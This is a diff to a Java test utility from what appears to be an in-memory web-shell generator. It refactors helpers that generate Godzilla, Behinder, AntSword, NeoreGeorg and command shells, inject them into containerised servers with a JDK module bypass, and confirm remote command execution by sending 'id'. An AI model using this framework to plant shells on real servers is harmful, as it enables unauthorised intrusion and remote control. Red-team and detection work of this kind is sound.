@@ -20,6 +20,7 @@ import org.testcontainers.containers.GenericContainer;
 import org.testcontainers.shaded.org.apache.commons.io.FileUtils;
 import org.testcontainers.shaded.org.apache.commons.lang3.RandomStringUtils;
 import org.testcontainers.shaded.org.apache.commons.lang3.StringUtils;
+import org.testcontainers.shaded.org.apache.commons.lang3.tuple.Pair;
 import org.testcontainers.utility.MountableFile;
 
 import java.io.IOException;
@@ -53,9 +54,8 @@ public class ShellAssertionTool {
     }
 
     @SneakyThrows
-    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
+    public static Pair<String, String> getUrls(String url, String shellType, ShellTool shellTool, Packers packer) {
         String shellUrl = url + "/test";
-
         String urlPattern = null;
         if (shellType.endsWith(ShellType.SERVLET)
                 || shellType.endsWith(ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER)
@@ -71,9 +71,26 @@ public class ShellAssertionTool {
             URL url1 = new URL(url);
             shellUrl = "ws://" + url1.getHost() + ":" + url1.getPort() + url1.getPath() + urlPattern;
         }
+        return Pair.of(shellUrl, urlPattern);
+    }
 
-        GenerateResult generateResult = generate(urlPattern, server, shellType, shellTool, targetJdkVersion, packer);
+    @SneakyThrows
+    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
+        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
 
+        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);
+
+        GenerateResult generateResult = generate(urlPattern, server, shellType, shellTool, targetJdkVersion, shellToolConfig);
+
+        packerResultAndInject(generateResult, url, shellTool, shellType, packer, appContainer);
+
+        assertShellIsOk(generateResult, shellUrl, shellTool, shellType, appContainer, pythonContainer);
+    }
+
+    @SneakyThrows
+    public static void packerResultAndInject(GenerateResult generateResult, String url, ShellTool shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) {
         String content = null;
         if (packer.getInstance() instanceof JarPacker) {
             byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult);
@@ -96,16 +113,19 @@ public class ShellAssertionTool {
             assertInjectIsOk(url, shellType, shellTool, content, packer, appContainer);
             log.info("send inject payload successfully");
         }
+    }
 
+    @SneakyThrows
+    public static void assertShellIsOk(GenerateResult generateResult, String shellUrl, ShellTool shellTool, String shellType, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
         switch (shellTool) {
             case Godzilla:
                 testGodzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                 break;
             case Command:
                 if (shellType.endsWith(ShellType.WEBSOCKET)) {
-                    testWebSocketCommandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()));
+                    testWebSocketCommandIsOk(shellUrl, "id");
                 } else {
-                    testCommandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()));
+                    testCommandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()), "id");
                 }
                 break;
             case Behinder:
@@ -144,11 +164,11 @@ public class ShellAssertionTool {
     }
 
     @SneakyThrows
-    public static void testCommandIsOk(String entrypoint, CommandConfig shellConfig) {
+    public static void testCommandIsOk(String entrypoint, CommandConfig shellConfig, String payload) {
         OkHttpClient okHttpClient = new OkHttpClient();
         HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                 .newBuilder()
-                .addQueryParameter(shellConfig.getParamName(), "id")
+                .addQueryParameter(shellConfig.getParamName(), payload)
                 .build();
         Request request = new Request.Builder()
                 .url(url)
@@ -161,7 +181,8 @@ public class ShellAssertionTool {
         }
     }
 
-    public static void testWebSocketCommandIsOk(String entrypoint, CommandConfig shellConfig) throws Exception {
+    @SneakyThrows
+    public static void testWebSocketCommandIsOk(String entrypoint, String payload) {
         final CountDownLatch latch = new CountDownLatch(1);
         final String[] responseHolder = new String[1];
         final long timeout = 5;
@@ -169,7 +190,7 @@ public class ShellAssertionTool {
         WebSocketClient client = new WebSocketClient(new URI(entrypoint)) {
             @Override
             public void onOpen(ServerHandshake data) {
-                send("id");
+                send(payload);
             }
 
             @Override
@@ -220,22 +241,7 @@ public class ShellAssertionTool {
         assertTrue(antSwordManager.getInfo().contains("ok"));
     }
 
-    public static GenerateResult generate(String urlPattern, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer) {
-        InjectorConfig injectorConfig = new InjectorConfig();
-        if (StringUtils.isNotBlank(urlPattern)) {
-            injectorConfig.setUrlPattern(urlPattern);
-        }
-
-        ShellConfig shellConfig = ShellConfig.builder()
-                .server(server)
-                .shellTool(shellTool)
-                .shellType(shellType)
-                .targetJreVersion(targetJdkVersion)
-                .byPassJavaModule(targetJdkVersion >= Opcodes.V9)
-                .debug(true)
-                .shrink(true)
-                .build();
-
+    public static ShellToolConfig getShellToolConfig(String shellType, ShellTool shellTool, Packers packer) {
         ShellToolConfig shellToolConfig = null;
         String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
         switch (shellTool) {
@@ -287,6 +293,24 @@ public class ShellAssertionTool {
                 log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                 break;
         }
+        return shellToolConfig;
+    }
+
+    public static GenerateResult generate(String urlPattern, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig) {
+        InjectorConfig injectorConfig = new InjectorConfig();
+        if (StringUtils.isNotBlank(urlPattern)) {
+            injectorConfig.setUrlPattern(urlPattern);
+        }
+
+        ShellConfig shellConfig = ShellConfig.builder()
+                .server(server)
+                .shellTool(shellTool)
+                .shellType(shellType)
+                .targetJreVersion(targetJdkVersion)
+                .byPassJavaModule(targetJdkVersion >= Opcodes.V9)
+                .debug(true)
+                .shrink(true)
+                .build();
         return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
     }
 
